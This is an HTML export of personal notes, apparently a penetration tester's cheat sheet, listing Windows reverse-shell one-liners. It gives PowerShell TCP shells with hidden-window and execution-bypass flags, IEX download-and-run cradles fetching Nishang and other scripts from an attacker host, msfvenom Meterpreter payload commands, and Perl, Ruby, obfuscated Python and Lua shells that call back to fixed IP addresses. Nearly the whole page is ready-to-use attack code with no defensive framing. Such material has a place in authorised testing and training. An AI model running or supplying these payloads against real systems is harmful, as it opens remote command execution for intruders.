<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Windows</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Shells - Windows</h1></strong><br /><br /><strong><h2>## PowerShell</h2></strong><br />One-liner:<br /><div class="codebox"><div class="codebox">powershell&nbsp;-NoP&nbsp;-NonI&nbsp;-W&nbsp;Hidden&nbsp;-Exec&nbsp;Bypass&nbsp;-Command&nbsp;New-Object&nbsp;System.Net.Sockets.TCPClient(&quot;10.0.0.1&quot;,4242);$stream&nbsp;=&nbsp;$client.GetStream();[byte[]]$bytes&nbsp;=&nbsp;0..65535|%{0};while(($i&nbsp;=&nbsp;$stream.Read($bytes,&nbsp;0,&nbsp;$bytes.Length))&nbsp;-ne&nbsp;0){;$data&nbsp;=&nbsp;(New-Object&nbsp;-TypeName&nbsp;System.Text.ASCIIEncoding).GetString($bytes,0,&nbsp;$i);$sendback&nbsp;=&nbsp;(iex&nbsp;$data&nbsp;2&gt;&amp;1&nbsp;|&nbsp;Out-String&nbsp;);$sendback2&nbsp;&nbsp;=&nbsp;$sendback&nbsp;+&nbsp;&quot;PS&nbsp;&quot;&nbsp;+&nbsp;(pwd).Path&nbsp;+&nbsp;&quot;&gt;&nbsp;&quot;;$sendbyte&nbsp;=&nbsp;([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</div></div><br /><br />Alternative one-liner:<br /><div class="codebox"><div class="codebox">powershell&nbsp;-nop&nbsp;-c&nbsp;&quot;$client&nbsp;=&nbsp;New-Object&nbsp;System.Net.Sockets.TCPClient(&#39;10.0.0.1&#39;,4242);$stream&nbsp;=&nbsp;$client.GetStream();[byte[]]$bytes&nbsp;=&nbsp;0..65535|%{0};while(($i&nbsp;=&nbsp;$stream.Read($bytes,&nbsp;0,&nbsp;$bytes.Length))&nbsp;-ne&nbsp;0){;$data&nbsp;=&nbsp;(New-Object&nbsp;-TypeName&nbsp;System.Text.ASCIIEncoding).GetString($bytes,0,&nbsp;$i);$sendback&nbsp;=&nbsp;(iex&nbsp;$data&nbsp;2&gt;&amp;1&nbsp;|&nbsp;Out-String&nbsp;);$sendback2&nbsp;=&nbsp;$sendback&nbsp;+&nbsp;&#39;PS&nbsp;&#39;&nbsp;+&nbsp;(pwd).Path&nbsp;+&nbsp;&#39;&gt;&nbsp;&#39;;$sendbyte&nbsp;=&nbsp;([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</div></div><br /><br /><strong><h3>### Staaldraad - mini-reverse.ps1:</h3></strong><br /><a href="https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/">https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/</a><br />1. Serve powershell script to target<br /><code>python -m SimpleHTTPServer</code><br /><br />2. Download and execute mini-reverse.ps1<br /><code>powershell IEX(New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.12:8000/mini-reverse.ps1&#39;)</code><br /><br /><strong><h3>### Nishang - Invoke-PowerShellTcp.ps1</h3></strong><br /><a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a><br /><br />1. Write reverse shell function to the end of Invoke-PowerShellTcp.ps1 script<br /><code>nano Invoke-PowerShellTcp.ps1<br />[...]<br />Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444</code><br /><br />2. Serve powershell script to target<br /><code>python -m SimpleHTTPServer</code><br /><br />3. Download reverse shell on target machine (it will auto-execute because of IEX)<br /><code>powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.12:8000/Invoke-PowerShellTcp.ps1&#39;)&quot;</code><br /><br />Alternative if <code>&quot;</code> and <code>&#39;</code> are causing problem (generated by msfvenom web_delivery module):<br /><code>powershell.exe -nop -w hidden -c $t=new-object net.webclient;$t.proxy=[Net.WebRequest]::GetSystemWebProxy();$t.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $t.downloadstring(&#39;</code><a href="http://10.10.14.5:8090/3eYP1GJ6iH')">http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1&#39;)</a><code>;</code><br /><br />Another alternative:<br /><code>powershell.exe -c IEX (New-Object Net.WebClient).downloadString(&#39;http://10.10.14.128:8000/Invoke-PowerShellTcp.ps1&#39;)</code><br /><br /><strong><h2>## Meterpreter</h2></strong><br />Windows Staged reverse TCP<br /><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f exe &gt; reverse.exe</code><br /><br />Windows Stageless reverse TCP<br /><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.110 LPORT=4242 -f exe &gt; reverse.exe</code><br /><br /><strong><h2>## Perl</h2></strong><br /><code>perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&quot;[IPADDR]:[PORT]&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</code><br /><br /><strong><h2>## Ruby</h2></strong><br /><code>ruby -rsocket -e &#39;c=TCPSocket.new(&quot;10.10.14.12&quot;,&quot;9001&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</code><br /><br /><strong><h2>## Python</h2></strong><br /><code>C:\Python27\python.exe -c &quot;(lambda __y, __g, __contextlib: [[[[[[[(s.connect((&#39;10.10.10.10&#39;, 9001)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type(&#39;except&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type(&#39;try&#39;, (), {&#39;__enter__&#39;: lambda self: None, &#39;__exit__&#39;: lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g[&#39;p2s_thread&#39;] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g[&#39;s2p_thread&#39;] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g[&#39;p&#39;] in [(subprocess.Popen([&#39;\\windows\\system32\\cmd.exe&#39;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g[&#39;s&#39;] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g[&#39;p2s&#39;], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l[&#39;s&#39;].send(__l[&#39;p&#39;].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;p2s&#39;)]][0] for __g[&#39;s2p&#39;], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l[&#39;p&#39;].stdin.write(__l[&#39;data&#39;]), __after())[1] if (len(__l[&#39;data&#39;]) &gt; 0) else __after())(lambda: __this()) for __l[&#39;data&#39;] in [(__l[&#39;s&#39;].recv(1024))]][0] if True else __after())())(lambda: None) for __l[&#39;s&#39;], __l[&#39;p&#39;] in [(s, p)]][0])({}), &#39;s2p&#39;)]][0] for __g[&#39;os&#39;] in [(__import__(&#39;os&#39;, __g, __g))]][0] for __g[&#39;socket&#39;] in [(__import__(&#39;socket&#39;, __g, __g))]][0] for __g[&#39;subprocess&#39;] in [(__import__(&#39;subprocess&#39;, __g, __g))]][0] for __g[&#39;threading&#39;] in [(__import__(&#39;threading&#39;, __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__(&#39;contextlib&#39;))&quot;</code><br /><br /><strong><h2>## Lua</h2></strong><br /><code>lua5.1 -e &#39;local host, port = &quot;10.0.0.1&quot;, 4444 local socket = require(&quot;socket&quot;) local tcp = socket.tcp() local io = require(&quot;io&quot;) tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, &quot;r&quot;) local s = f:read(&quot;*a&quot;) f:close() tcp:send(s) if status == &quot;closed&quot; then break end end tcp:close()&#39;</code><br /><br /><br /><br /></div>
</body>
</html>
